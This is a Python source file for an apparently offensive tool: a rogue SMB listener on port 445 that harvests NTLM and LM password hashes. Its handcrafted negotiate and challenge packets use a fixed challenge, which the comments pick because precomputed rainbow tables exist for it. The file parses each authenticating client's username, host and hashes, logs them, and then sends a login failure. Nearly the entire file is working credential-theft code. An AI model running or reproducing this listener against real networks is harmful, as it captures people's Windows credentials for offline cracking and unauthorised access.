import socket
import struct
import sys
import util
from threading import Thread
from service import Service


class smb(Service):
    def __init__(self):
        super(smb, self).__init__('SMB Service')
        self.captured_hashes = {}
        self.info = """
                    SMB listener for harvesting NTLM/LM hashes.
                    Authentication requests use the standard challenge of
                    1122334455667788, for which plenty of generated rainbow
                    tables exist already.
                    """

    # parse NTLM/LM hashes
    # scapy has very limited SMB packet support, so we have to do this manually
    def parse_credentials(self, data):
        # offsets based on security blob starting at data[59]
        data = data[59:]

        lm_offset = struct.unpack('<I', data[16:20])[0]
        ntlm_offset = struct.unpack('<I', data[24:28])[0]
        name_length = struct.unpack('<h', data[36:38])[0]
        name_offset = struct.unpack('<I', data[40:44])[0]
        host_length = struct.unpack('<h', data[46:48])[0]
        host_offset = struct.unpack('<I', data[48:52])[0]

        lm_hash = ntlm_hash = ''
        # LM hash
        for i in data[lm_offset:lm_offset + 24]:
            tmp = str(hex(ord(i))).replace('0x', '')
            if len(tmp) is 1:
                # hex() removes leading 0's in hex; we need them.
                tmp = '0' + tmp
            lm_hash += tmp
        # NTLM hash
        for i in data[ntlm_offset:ntlm_offset + 24]:
            tmp = str(hex(ord(i))).replace('0x', '')
            if len(tmp) is 1:
                tmp = '0' + tmp
            ntlm_hash += tmp

        # host name
        hname = ''
        for i in range(host_offset, (host_offset + host_length)):
            tmp = struct.unpack('<c', data[i])[0]
            if tmp is '\x00':
                continue
            hname += tmp

        if name_length > 100:
            # sanity
            return

        # user name
        uname = ''
        for i in range(name_offset, (name_offset + name_length)):
            tmp = struct.unpack('<c', data[i])[0]
            if tmp is '\x00':
                # null bytes
                continue
            uname += tmp

        # add the username and build the list
        # list consists of
            # HOST NAME
            # LM HASH
            # NTLM HASH
        if not uname in self.captured_hashes:
            tmp = [hname, lm_hash.upper(), ntlm_hash.upper()]
            self.captured_hashes[uname] = tmp

        data = 'Username: %s\nHost: %s\nLM: %s\nNTLM: %s\nChallenge: %s\n' \
                                % (uname, hname, lm_hash.upper(),
                                ntlm_hash.upper(), '1122334455667788')
        self.log_msg(data)

    # get packet payload
    def get_payload(self, data):
        hexcode = str(hex(ord(data[4])))
        if hexcode == '0x72':
            # Build the payload for a Negotiate Protocol Response
            # netbios
            payload = "\x00\x00\x00\x55"
            # smb header
            payload += "\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x98\x53\xc8"
            payload += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            payload += "\xff\xff\xff\xfe\x00\x00\x00\x00"
            # negotiate protocol response
            payload += "\x11\x05\x00\x03\x0a\x00\x01\x00\x04\x11\x00\x00"
            payload += "\x00\x00\x01\x00\x00\x00\x00\x00\xfd\xe3\x00\x80"
            payload += "\x11\xb9\x14\xe4\x77\xc8\xcd\x01\x68\x01\x00\x10"
            payload += "\x00\xb5\x9b\x73\x9d\xb7\xc2\xb7\x40\x83\xd6\x52"
            payload += "\x31\xec\xb3\x84\x53"
            return (payload, 0)
        elif hexcode == '0x73':
            # check if its a NEGOTIATE or AUTH
            message_type = str(hex(ord(data[67])))
            if message_type == '0x1':
                # Build the payload for a NTLMSSP_CHALLENGE
                # netbios
                payload = "\x00\x00\x00\xdd"
                # smb header
                payload += "\xff\x53\x4d\x42\x73\x16"
                payload += "\x00\x00\xc0\x98\x07\xc8\x00\x00\x00\x00\x00"
                payload += "\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
                payload += "\x00\x08\x10\x00"
                # session setup andx response, error more processing
                payload += "\x04\xff\x00\xdd\x00\x00\x00\x68\x00\xb2\x00"
                payload += "\x4e\x54\x4c\x4d\x53\x53\x50\x00\x02\x00\x00"
                payload += "\x00\x04\x00\x04\x00\x38\x00\x00\x00\x15\x82"
                payload += "\x8a\xe2\x11\x22\x33\x44\x55\x66\x77\x88\x00" #ntlm challenge 1122334455667788
                payload += "\x00\x00\x00\x00\x00\x00\x00\x2c\x00\x2c\x00"
                payload += "\x3c\x00\x00\x00\x05\x01\x28\x0a\x00\x00\x00"
                payload += "\x0f\x4e\x00\x4f\x00\x02\x00\x04\x00\x4e\x00"
                payload += "\x4f\x00\x01\x00\x04\x00\x4e\x00\x4f\x00\x04"
                payload += "\x00\x04\x00\x6e\x00\x6f\x00\x03\x00\x04\x00"
                payload += "\x6e\x00\x6f\x00\x06\x00\x04\x00\x01\x00\x00"
                payload += "\x00\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e"
                payload += "\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00"
                payload += "\x35\x00\x2e\x00\x31\x00\x00\x00\x57\x00\x69"
                payload += "\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00"
                payload += "\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20"
                payload += "\x00\x4c\x00\x41\x00\x4e\x00\x20\x00\x4d\x00"
                payload += "\x61\x00\x6e\x00\x61\x00\x67\x00\x65\x00\x72"
                payload += "\x00\x00"
                return (payload, 0)
            elif message_type == '0x3':
                # should be an AUTH packet
                # parse credentials
                self.parse_credentials(data)
                # send a STATUS_LOGIN_FAILURE
                # netbios
                payload = "\x00\x00\x00\x23"
                # smb header
                payload += "\xff\x53\x4d\x42\x73\x6d\x00\x00\xc0\x98\x07"
                payload += "\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                payload += "\x00\x00\xff\xff\xff\xfe\x00\x08\x20\x00"
                # session setup andx response, status_login_failure
                payload += "\x00\x00\x00"
                return (payload, 1)
            else:
                return (None, 1)

    # dbg -- dump the packet
    def dbg_dump(self, data):
        cnt = 0
        for i in data:
            sys.stdout.write(str(hex(ord(i))) + ' ')
            cnt += 1
            if cnt % 16 == 0:
                print ''
                cnt = 0
        print ''

    # handle packets
    def handler(self, con, data):
        try:
            if len(data) > 4:
                data = data[4:]
                (payload, err) = self.get_payload(data)
                if not payload is None and err is 0:
                    con.send(payload)
                elif not payload is None and err is 1:
                    con.send(payload)
                    return False
                else:
                    return False
        except Exception, j:
            util.Error('SMB error: %s' % j)
            return False
        return True

    # threaded init
    def initialize_bg(self):
        util.Msg('Starting SMB listener...')
        thread = Thread(target=self.initialize)
        thread.start()
        return True

    # initialize SMB listener
    def initialize(self):
        socker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socker.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        socker.settimeout(3)
        socker.bind(('', 445))
        socker.listen(5)
        self.running = True
        try:
            while self.running:
                try:
                    con, addr = socker.accept()
                except KeyboardInterrupt:
                    break
                except:
                    continue
                self.log_msg('Connection from %s' % addr[0])
                while self.running:
                    data = con.recv(256)
                    if not self.handler(con, data):
                        break
                con.shutdown(socket.SHUT_RDWR)
                con.close()
                self.log_msg('Closed connection with %s.\n' % addr[0])
        except KeyboardInterrupt:
            self.running = False
        except socket.error:
            pass
        except Exception, j:
            util.Error('Error with SMB listener: %s' % j)
            self.running = False
        socker.close()
        util.debug('SMB listener shutdown.')

    def cli(self, parser):
        """ initialize CLI options
        """
        parser.add_argument('--smb', help='SMB Service', action='store_true',
                                   default=False, dest=self.which)
